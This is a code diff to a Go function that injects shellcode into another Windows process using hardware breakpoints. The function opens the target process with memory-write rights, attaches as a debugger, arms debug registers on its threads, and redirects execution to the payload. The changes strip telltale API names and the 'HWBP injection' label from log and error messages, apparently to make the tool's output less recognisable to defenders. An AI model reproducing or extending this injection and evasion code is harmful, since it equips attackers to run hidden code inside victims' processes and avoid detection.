@@ -192,7 +192,7 @@ func disarmThreadsBreakpoint(tids []uint32) {
 // successfully redirect a target thread.
 func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 	if runtime.GOOS != "windows" {
-		return "", fmt.Errorf("HWBP injection requires Windows")
+		return "", fmt.Errorf("This injection method requires Windows")
 	}
 	if len(params.Shellcode) == 0 {
 		return "", fmt.Errorf("shellcode is empty")
@@ -202,7 +202,7 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 	}
 	currentPID, _, _ := procGetCurrentProcessId.Call()
 	if uintptr(params.PID) == currentPID {
-		return "", fmt.Errorf("HWBP injection cannot target the current process (PID %d)", params.PID)
+		return "", fmt.Errorf("Cannot target the current process (PID %d)", params.PID)
 	}
 	if params.TimeoutMs == 0 {
 		params.TimeoutMs = 30000
@@ -216,7 +216,7 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	sb.WriteString(fmt.Sprintf("[*] HWBP injection target: %s @ 0x%X\n", apiLabel, apiAddr))
+	sb.WriteString(fmt.Sprintf("[*] Breakpoint target: %s @ 0x%X\n", apiLabel, apiAddr))
 	sb.WriteString(fmt.Sprintf("[*] Target PID: %d, shellcode size: %d, timeout: %dms\n",
 		params.PID, len(params.Shellcode), params.TimeoutMs))
 
@@ -224,7 +224,7 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 	desiredAccess := uint32(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
 	hProcess, err := injectOpenProcess(desiredAccess, params.PID)
 	if err != nil {
-		return sb.String(), fmt.Errorf("OpenProcess(pid=%d): %w", params.PID, err)
+		return sb.String(), fmt.Errorf("process open (pid=%d): %w", params.PID, err)
 	}
 	defer injectCloseHandle(hProcess)
 	sb.WriteString(fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess))
@@ -239,9 +239,9 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 	// Step 4: attach as debugger.
 	ret, _, dbgErr := procDebugActiveProcess.Call(uintptr(params.PID))
 	if ret == 0 {
-		return sb.String(), fmt.Errorf("DebugActiveProcess(pid=%d): %w", params.PID, dbgErr)
+		return sb.String(), fmt.Errorf("debugger attach (pid=%d): %w", params.PID, dbgErr)
 	}
-	sb.WriteString("[+] Attached as debugger via DebugActiveProcess\n")
+	sb.WriteString("[+] Attached as debugger\n")
 
 	// Ensure the target survives our exit.
 	if r, _, _ := procDebugSetProcessKillOnExit.Call(0); r == 0 {
@@ -271,7 +271,7 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 		sb.WriteString("[-] " + d + "\n")
 	}
 	if armed == 0 {
-		return sb.String(), fmt.Errorf("could not arm any thread with HWBP")
+		return sb.String(), fmt.Errorf("could not arm any thread with breakpoint")
 	}
 	sb.WriteString(fmt.Sprintf("[+] Armed %d/%d threads with DR0 = 0x%X\n", armed, len(tids), apiAddr))
 
@@ -360,10 +360,10 @@ func hwbpInjectShellcode(params HwbpInjectionParams) (string, error) {
 done:
 	// Step 7: detach.
 	if r, _, e := procDebugActiveProcessStop.Call(uintptr(params.PID)); r == 0 {
-		sb.WriteString(fmt.Sprintf("[!] DebugActiveProcessStop failed: %v\n", e))
+		sb.WriteString(fmt.Sprintf("[!] Debugger detach failed: %v\n", e))
 	} else {
 		detached = true
-		sb.WriteString("[+] Detached debugger via DebugActiveProcessStop\n")
+		sb.WriteString("[+] Detached debugger\n")
 	}
 
 	elapsedMs := time.Since(start).Milliseconds()
@@ -382,7 +382,7 @@ done:
 		return sb.String(), fmt.Errorf("breakpoint never fired within %dms (target may not be calling %s)",
 			params.TimeoutMs, apiLabel)
 	}
-	sb.WriteString("[+] HWBP injection completed successfully\n")
+	sb.WriteString("[+] Breakpoint injection completed successfully\n")
 	return sb.String(), nil
 }
 
